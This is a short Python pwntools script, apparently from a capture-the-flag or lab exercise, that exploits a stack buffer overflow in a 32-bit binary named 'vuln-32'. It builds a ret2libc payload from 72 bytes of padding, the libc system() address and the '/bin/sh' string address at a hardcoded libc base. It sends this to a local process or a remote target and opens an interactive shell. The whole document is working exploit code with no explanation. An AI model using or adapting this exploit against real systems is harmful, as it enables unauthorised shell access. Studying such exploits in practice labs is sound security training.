#!/usr/bin/python3

from pwn import *

#REMOTE = True      			# test remote
REMOTE =False       			# test local

elf = context.binary = ELF('./vuln-32')

if REMOTE :
    #p = remote('REMOTEIP',PORT) 	# test remote
    p = remote('',PORT)
else:
	p = process('./vuln-32')

#========= exploit here ================

libc = elf.libc
libc.address = 0xf7da1000

system = libc.sym['system']
binsh = next(libc.search(b'/bin/sh'))

payload = b'A' * 72
payload += p32(system)
payload += p32(0x0)
payload += p32(binsh)

p.recvline()
p.sendline(payload)

#========= interactive ====================
p.interactive()
